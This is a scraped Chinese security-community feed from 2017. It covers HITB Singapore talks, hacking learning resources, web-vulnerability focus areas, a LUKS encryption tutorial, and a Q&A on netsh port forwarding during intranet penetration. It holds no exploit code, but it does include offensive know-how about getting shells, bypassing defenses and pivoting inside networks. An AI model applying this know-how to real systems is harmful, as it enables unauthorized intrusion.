<img src="https://images.xiaomiquan.com/FlsYIGLOb73zh-V4TRmv9LsISZ1S?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Ta6g2VnpzVfE0_Hw9dv_EW2aF2A=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FjSifkt7_CD35_Opt9qMp-Zjc1qm?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nrxhjJKmo3J1CQz6nbOm101G3sI=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FiGquttDISw_Fi9dzYwdNxTa4hK5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fxGKCJGKcVkwAZs5OV9abgMskRQ=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fip74nHLjrju3NIIeuTbfsHMepQM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ETLwZqow9zWnp_Wj8RH98CiMTTc=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fr7exbl4kKLQO_XLhTRA4ZIgvAHo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:C1hV5iZRVU-RIgTYSQJLN06fJKs=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FuYcRypQ1lC-N1Y4ojt4-v8Nrc1K?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:64YFUMqxV4BSUB-rxxHHSQffC1U=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fuh37iVc3RURM00xVhFzQm7aB0CE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:B3wCY6QRdvLxy4drchhtROqwWCI=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  SouceClear 这家的 Keynote 挺不错的，他们的平台与思路可以大规模分析开源代码安全（漏洞与恶意）。

我们的很多产品、工程项目都会用到大量的开源代码，如果这些有问题，我们的也会有问题。随着代码越来越庞大，想全面发现是一件很有挑战的事。

这让我想起当年黑哥和我们搞的另一套平台，不过没做成这样的形态。

大规模源码安全审计很不错。😄

<img src="https://images.xiaomiquan.com/FguPls-ksZzsbcBx-fe48Mn5Pm21?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:aZkvJqNMydq40qMUry7qaQOe-FU=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FlOchJvbBjtLDbQpZl_Nxh7nzztY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:eIc2Nqun_N7-_ZBW49ml319swgk=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fmce17G16SNH1fqEmhMMMZqKG8Na?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Mdf9zjeHMJH8SUwbYurfHLi_cXA=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Ftx0n1GdVvRfEssoheHsi_9T5zhh?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BEMyLDpu52QoGz4re1WSQb3jrn0=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FpSeDagHME0Hl1cmNzxFHR3p7ZzN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PlbtFfakY21yov8GfcBwRtflHbk=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FiBy7mdxz0n1_L5cI9maz9tZ7HD1?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:9S83qfW6JKDR2PLgj0W6XmQ_NIQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Secure Graph Language，这个概念有意思

<img src="https://file.xiaomiquan.com/33/08/3308896605770601ded922d46602b2ac402581abd936fd953adaf4a226424091.jpg" width="25px"/> __谭翔宇__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 代码扫描工具比如fortify checkmarx不能覆盖开源程序漏洞么？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/33/08/3308896605770601ded922d46602b2ac402581abd936fd953adaf4a226424091.jpg" width="25px"/> __谭翔宇__: 可以的啊，只是大家玩法有差异


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  开场的一个15分钟分享《IoT - A security hole without a patch》，来自赞助商 Cisco Talos 的，所以，也就是布道下...

布道的建议还是可以的...

我们都懂。

<img src="https://images.xiaomiquan.com/FkfGY2TUYkGFXoW1Hfs65VkUNkkv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-3hy7j20oMfBVslaMoXiy795U-o=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FpQHoT5FYi1mNukoHYtlDwtBMeSQ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fq0YqIU6pcBjgzLEvpt59TISsog=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FtfIE0Soza6FQZJVTcjygGlNdAQm?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lCv06QF93SIsLzJaQT9YQKTS71k=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Foscam这个国产摄像头被玩坏了，漏洞太对

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 开始了吗😋

<img src="https://file.xiaomiquan.com/23/09/23091c17d1fee9990569279ef5daed0ec260736405e8e9a9619dcb084a4d09d8.jpg" width="25px"/> __小后__: 网上有视频了不，最近有些忙，哪位大神给发个链接，我也无耻的做伸手党


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

  HITB Singapore. Cos is here.😏

<img src="https://images.xiaomiquan.com/FstqpR9oc0rO6HNqM7iXIsA24ACe?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:bgkUjzDqHEFSVOaGLY_spSpPBIU=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrEYI3XSYtNPHQV8UubABfTM7WRu?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:5AHb94dY0uTvXJRTmUCbbJonRDI=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvLBP6hO2NbswrF16pdrxRPLrGqk?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:up_mOPRD6RSKjKSkjZhdq6Ry-7A=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-23:


__#HITB#__

  明后两天是 HITB 新加坡的演讲日，我看好议题不少，如果没什么意外，我会在本圈里“直播”分享。

这是第一次以我新公司的这个重要品牌（Joinsec）来合作，与全球优秀的黑客建立联系。

<img src="https://images.xiaomiquan.com/FuFm12unlbr7T_PA2XPjaGcWQQJp?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:MMGV75vpHxo1VTSPtCiOIBDHpmQ=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fg0ao59pCQ_8koaKL9ojIz1FDu7W?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:OoauiLjXJ0Rva0_dDFWnGNXw8xA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 去新加坡了？😍

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 嗯来交流学习😏

<img src="https://file.xiaomiquan.com/53/47/5347354a88eb4ffccc47774564dbc1da7c4951492cc33532ae19d05075008cbf.jpg" width="25px"/> __缘起是源__: 期待😄

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 期待分享

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 期待


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-23:


__#资源#__

 编程学习资源之小甲鱼
我的经历：
我是不爱读书的那种，生性放荡，但是那时候我特别喜欢解数学几何题，感觉运用各种定理、知识点去解开几何题，那种成功的感觉很爽快。后来我发现hack跟这个很像。

我刚开始接触hack的时候是在上初中的时候，那个时候就是抄起工具，看着网上的教程，一顿扫，利用现成工具全自动拿shell，就是为了那个快感，很明显不懂原理的话，碰到稍微复杂一点的情况，就直接歇菜了。然后就很沮丧，算了，不搞了！

找到自己的兴趣点：
hack相比解几何题，需要的知识点更多，并且需要一定深度，关键是在你没找到你的兴趣点的时候，你去学乏味的代码，让人感觉很枯燥，也就不容易找到你的兴趣点，所以很多人止住在这里了。

我那个时候也一样，并没有深入，直到我工作之后，迫于生活的压力，硬逼着自己去学    tcp和各种网络协议、操作系统、C、php、js、python有了一些基础之后我发现原来当‘’伪黑客‘’时，利用的那些漏洞，原来是这样造成的，我不仅可以用网上提供的方法，我还可以自己根据自己的思路去拿下shell，碰到一些管理员有对一些sql注入漏洞和提权做了一些安全措施的时候，自己也可以去想办法去绕过。这就有点类似我当初的解几何题了，特别在内网渗透方面，熟悉网络知识后，我可以很容易知道目标网络架构和其中的弱点，甚至控制一些网络设备来帮助渗透，交换机、防火墙、甚至控制堡垒机。

好了，我们知道这种兴趣是最重要的，那么如何去寻找这种兴趣呢？就拿开锁来讲，你首先需要了解这种锁的结构和原理吧？

你玩XSS那么，js这个核心魔法，你必须精通才能玩的好吧，你玩逆向，汇编和C、操作系统原理、程序设计，这些你都必须熟练掌握吧？

好了，到今天关于学习方法的问题了，我刚开始是买一本书，硬着头皮去看，看完是没问题，但是感觉都明白，但是又啥都做不了，我就想这种方法，不适合我，我从中不能产生兴奋感，我肯定坚持不下去，那个时候无意中搜到‘小甲鱼‘的编程视频。

零基础入门学习C语言（旧版）
带你学C带你飞 | 第一季：语法基础（新版）
零基础入门学习汇编语言
零基础入门学习Delphi
C++快速入门
数据结构和算法
WIN32汇编语言程序设计
零基础入门学习Python
Windows程序设计（SDK）
解密系列
以上是小甲鱼7年来发布的视频教程，作者讲解过程中时不时穿插冷笑话和黄段子，我不知道其它人喜不喜欢，但是我很喜欢这种风格，把复杂的东西讲简单，很适合入门吧，如果需要深入的话就看书，比如python就把 python核心编程好好通读。

目前我的C 和汇编python都是看的他的视频入门的，觉得很轻松，感觉我好像是在给他打广告了，哈哈，但是重要的是，他都是免费的！
我觉得如果你真的是想学点技术，就沉下心来把这些基础打好，然后去寻找自己的hack兴趣点，跟着自己的兴趣来，不要总跟着大神后面讨论前沿的技术，实际上自己也就处于仅仅知道，而不是处于hack阶段。



...

<img src="https://file.xiaomiquan.com/da/b6/dab69aac677723417e6dd4669c128b0fcb3476d48d21c01263daa3c71025e669.jpg" width="25px"/> __萝卜D__: 我也是跟着小甲鱼来学的汇编，也喜欢这种风格

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 基础不牢，地动山摇

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/b6/dab69aac677723417e6dd4669c128b0fcb3476d48d21c01263daa3c71025e669.jpg" width="25px"/> __萝卜D__: 👊

<img src="https://file.xiaomiquan.com/23/09/23091c17d1fee9990569279ef5daed0ec260736405e8e9a9619dcb084a4d09d8.jpg" width="25px"/> __小后__: 我是跟着小甲鱼学汇编的😉

<img src="https://file.xiaomiquan.com/c1/02/c10251c57ac6c42c3feff9cab92abcd3d7795f46761f00188ccf842e9b5334d6.jpg" width="25px"/> __暖暖__: 在圈子里逛了一圈 发现看什么都是不明觉厉的感觉，我还是先好好学一学语言基础吧，谢谢分享😍

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/c1/02/c10251c57ac6c42c3feff9cab92abcd3d7795f46761f00188ccf842e9b5334d6.jpg" width="25px"/> __暖暖__: 搞安全的妹子很抢手的哦，加油！😉

<img src="https://file.xiaomiquan.com/ec/99/ec993b38797116db03f7c67d26cd6dfea2f888d618ecabeb86a7d796328926d2.jpg" width="25px"/> __SimonTian__: 小甲鱼的那套不错 比较🌊


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-22:

> 匿名用户 提问：
余弦大大求教，机器学习在安全领域应用多吗？我知道可以用在waf，ddos防御上，但不知道效果咋样。


多呀，未来这个会是竞争壁垒，无论是对个人来说，还是对相关产品。这个未来很快就会到。

机器学习效果还是很明显的，对于大数据场景来说，可惜我还是半吊子，不敢乱说，等有些突破了再来说吧。



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 点赞，个人想往这个领域发展，一方面有所壁垒，一方面又是网络安全行业。生存不易，想去做黑产了都。。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 都不容易，黑产可以了解却不能踏进去。

<img src="https://file.xiaomiquan.com/79/68/7968b751ccc4269af04247db62808573076a3fce2db099058271513bbfb42d2c.jpg" width="25px"/> __王同学__: 道哥的黑板报，
[弹性安全网络 -- 构建下一代安全的互联网](http://mp.weixin.qq.com/s/epFSC88J7LF3BGwQdoZ-Rg)



<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/79/68/7968b751ccc4269af04247db62808573076a3fce2db099058271513bbfb42d2c.jpg" width="25px"/> __王同学__: 懂技术，懂运营，懂管理。最重要的是道哥很会做影响力！技术其实并不是最重要的

<img src="https://file.xiaomiquan.com/79/68/7968b751ccc4269af04247db62808573076a3fce2db099058271513bbfb42d2c.jpg" width="25px"/> __王同学__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 很赞同！


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-22:

> 匿名用户 提问：
弦哥你好，某省通信管理局牵头组织安全攻防赛主要分了6个方向(逆向,漏洞挖掘与利用,密码，智能终端,web渗透,MISC)，由于之前未参加过此类攻防赛，所以找弦哥和小伙伴们分享一下这方面的经验，以及各个方向主要的重点知识考察是哪些，谢谢


你描述的这6个方向是 CTF 经典的分类，可以搜索本圈的内容“CTF”，之前的一些回答与分享够了，刷刷刷，刷题刷多了就能拿名次啦。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-21:


__#经验#__

  新 Web 安全主要就这些关键点：前端（XSS、CSRF），后端（SSRF、XXE、反序列化、模版注入、逻辑漏洞），那些老方式不是没用，而是不要总当重点来提，时代变了...

这句话之前对外发过，不过这里完善了点。对 Web 安全感兴趣并在玩这个的，多投入上面说的这些点。

另外一个大的 Web 安全分支纬度不得不提 Java Web 安全，重要性是被 Struts2 这个漏洞马蜂窝搞起来的。而很多企业级应用，基于 J2EE 构建的应用服务器（如：WebLogic、WebSphere、GlassFish、Resin，还有 JBoss，国内的 TongWeb、Apusic 等），历史上也出过不少安全问题，尤其是前两年的反序列化漏洞。由于这些经常用在企业里，影响会更大，那么漏洞价值也会大很多。

这些都是当下 Web 安全值得重点投入的点。要挖掘其 0day，思路只有一个：把历史所有漏洞能复现的都复现一遍，多总结多琢磨，勤奋出 0day，自古不变的真理！



...

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 您提到的那些老方式是指哪些方式？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 见国内各乙方扫描报告，还可以见“Web安全大曝光”里的内容

<img src="https://file.xiaomiquan.com/4f/27/4f27e33a4b6e51d552dce8ca94028094fe37aa502aaa6e8e9fa1f3fecafffb8c.jpg" width="25px"/> __st0n3__: 这算是大佬回答我的提问吗👀

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/4f/27/4f27e33a4b6e51d552dce8ca94028094fe37aa502aaa6e8e9fa1f3fecafffb8c.jpg" width="25px"/> __st0n3__: 是的 不好意思收那么多钱😄

<img src="https://file.xiaomiquan.com/4f/27/4f27e33a4b6e51d552dce8ca94028094fe37aa502aaa6e8e9fa1f3fecafffb8c.jpg" width="25px"/> __st0n3__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 对您更加钦佩了

<img src="https://file.xiaomiquan.com/60/31/6031f548058576081a414d88b5a371be0c6c838043fb0520e64fa8797fb8c618.jpg" width="25px"/> __莫_努力增肥25斤__: 没搜到 Web安全大曝光 相关内容，请问这是文章还是？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/31/6031f548058576081a414d88b5a371be0c6c838043fb0520e64fa8797fb8c618.jpg" width="25px"/> __莫_努力增肥25斤__: 是书

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/31/6031f548058576081a414d88b5a371be0c6c838043fb0520e64fa8797fb8c618.jpg" width="25px"/> __莫_努力增肥25斤__: 可以搜 黑客大曝光 Web

<img src="https://file.xiaomiquan.com/60/31/6031f548058576081a414d88b5a371be0c6c838043fb0520e64fa8797fb8c618.jpg" width="25px"/> __莫_努力增肥25斤__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 谢谢 找到了😄


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-21:


__#资源#__

 XSS 能做什么

这篇 Paper 作为入门了解不错，英文也简单。作者的 PPT 做得也挺有趣的。推荐。

昨天我在知乎 Live 里做的“如何保护自己的隐私与安全”线上分享里提到了 iPhone 端的 App XSS 威力，这个在实际攻击里脑洞不小，算是开启了 XSS 的一扇新门。

未来都会逐步公布。


__分享文件:__
[XSS FTW.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
[XSS FTW.pptx](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-08-21:

今天分享文件加密

出于各种各样的原因，我们都有一些文件需要加密，万一文件被盗对方也无法恢复，加密工具多如牛毛，我尽量推荐可信的工具


Truecrypt
	
	平台：windows/Linux/MacOS
	斯诺登曾推荐过这款加密工具，图形化界面，由于其加密严格，难以破解，作者一直保持神秘，但在其官网遭到入侵后据传其作者被NSA请去喝茶，在2014年停止更新，官网请大伙移驾微软的BitLocker，公开的理由是truecrypt被曝光存在提权漏洞，不过这个比较牵强，毕竟truecrypt源码经过两次代码审计，并没有发现明显的后门。目前不建议使用最后一版7.2（喝茶后的版本），建议使用7.1.a或更早的版本。
官网已死，下载请去
[TCnext - Site dedicated to the development of the ...](https://truecrypt.ch/)


使用上的howto请google，很多

dm-crypt

	平台：Linux
	Linux内核提供的磁盘加密工具，“dm-crypt”是 Linux 内核提供的一个磁盘加密功能，而“cryptsetup”是一个命令行的前端，通过它来操作“dm-crypt”。

使用dm-crypt首先你要先安装cryptsetup，在ubuntu中：apt-get install cryptsetup

dm-crypt既可以加密整块物理磁盘也可以加密一个虚拟磁盘，这里我给出一个方便简易的使用方法，需要深入的可以看官方文档
[cryptsetup / cryptsetup · GitLab](https://gitlab.com/cryptsetup/cryptsetup)



首先要创建一个容器文件，通过 fallocate 创建一个 10GB 容器文件。
fallocate -l 10G /root/luks.vol

接下来使用cryptsetup加密这个文件容器得到一个虚拟加密盘
cryptsetup --cipher aes-xts-plain64 --key-size 512 --hash sha512 --iter-time 10000 luksFormat /root/luks.vol
参数含义：
--cipher	加密方式
--key-size	密钥长度
--hash	散列算法
--iter-time	迭代时间

使用如下命令打开上述的文件容器，使用的映射名是 xxx（你也可以改用其它单词）。
cryptsetup luksOpen /root/luks.vol xxx
　　打开之后，该虚拟盘会被映射到 /dev/mapper/xxx
　　你可以用如下命令看到：
ls /dev/mapper/
由于加密盘已经打开并映射到 /dev/mapper/xxx 你可以在 /dev/mapper/xxx 之上创建文件系统。命令如下（文件系统类型以 ext4 为例）
mkfs.ext4 /dev/mapper/xxx
创建完文件系统之后，你还需要挂载该文件系统，才能使用它。挂载的步骤如下。
　　首先，你要先创建一个目录，作为【挂载点】。俺把“挂载点”的目录设定为 /mnt/xxx（当然，你可以用其它目录作为挂载点）。
mkdir /mnt/xxx
　　创建好“挂载点”对应的目录，下面就可以进行文件系统的挂载。
mount /dev/mapper/xxx /mnt/xxx
　　挂载好文件系统，用如下命令查看，就可以看到你刚才挂载的文件系统。
df -hT
接下来，你就可以通过 /mnt/xxx 目录去访问该文件系统。当你往 /mnt/xxx 下面创建下级目录或下级文件，这些东东将被存储到该虚拟加密盘上。

当你使用完，要记得退出。包括下面两步：
　　卸载文件系统
umount /mnt/xxx
　　关闭加密盘
cryptsetup close xxx

之后你需要再次使用这个加密盘的时候只需要
cryptsetup luksOpen /root/luks.vol xxx
mount /dev/mapper/xxx /mnt/xxx
使用完后
umount /mnt/xxx
cryptsetup close xxx


(附图，两种加密工具的对比)

<img src="https://images.xiaomiquan.com/FtUcF_H1D7ntUc5xgSt1DtU6uGd6?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:__vxJ0s3BpiVd-U5wVIlLWsMSfQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 还可以考虑用 TrueCrypt 后的一个分支版本 VeraCrypt

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 是的 Truecrypt官网已经用醒目红色字体警告:Using TrueCrypt is not secure，而且Truecrypt幕后的捐赠者也是很敏感😷

<img src="https://file.xiaomiquan.com/bf/f8/bff8ac74efe0ea61b12ec062defb01cf36b89beb446bf4cfec4a5a9a3130820d.jpg" width="25px"/> __Charles__: 想起当年大学时电脑里的岛国姐姐都是用truecrypt来守护的，舍友曾翻遍我电脑都找不到😂


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-20:

> 匿名用户 提问：
问表哥一个内网渗透中端口转发的问题。
目标主机是Windows 7。内网ip为172.26.14.15。
NetSH 缺省listenaddress参数 的情况下，是监听127.0.0.1 loopback 还是监听本地IP？
也就是说缺少listenaddress的情况下，是listenaddress=127.0.0.1还是listenaddress=172.26.14.15。


没有listenaddress 参数的话就直接是本地ip地址，你可以用netstat -an 看监听的端口，是0.0.0.0



---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-20:

> 匿名用户 提问：
问表哥一个内网渗透中端口转发的问题。
目标主机是Windows 7。内网ip为172.26.14.15。
NetSH 缺省listenaddress参数 的情况下，是监听127.0.0.1 loopback 还是监听本地IP？
